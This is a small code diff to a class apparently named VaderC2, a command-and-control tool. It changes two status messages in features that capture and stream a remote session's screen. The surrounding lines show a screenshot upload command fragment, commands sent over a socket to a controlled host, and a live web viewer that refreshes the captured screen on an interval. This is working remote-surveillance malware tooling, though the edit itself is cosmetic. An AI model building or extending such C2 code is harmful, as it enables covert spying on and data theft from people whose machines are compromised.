@@ -862,7 +862,7 @@ class VaderC2:
                             '-ContentType \'application/octet-stream\'; '
                             'echo SCREENSHOT_SENT"'
                         )
-                        print(f"  {AMBER}[*] Capturing + pulling screen via {matches[0][:8]}...{RST}")
+                        print(f"  {AMBER}[*] Capturing + pulling screen via {s.id[:8]}...{RST}")
                         try:
                             s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
                             received.wait(timeout=30)
@@ -972,7 +972,7 @@ setInterval(grab,{interval*1000});
                             pass
 
                         print(f"  {GREEN}[+] Live viewer: http://0.0.0.0:{view_port} — refreshes every {interval}s{RST}")
-                        print(f"  {AMBER}[*] Streaming screen from {matches[0][:8]}... Ctrl+C to stop{RST}")
+                        print(f"  {AMBER}[*] Streaming screen from {s.id[:8]}... Ctrl+C to stop{RST}")
 
                         frame_count = [0]
 
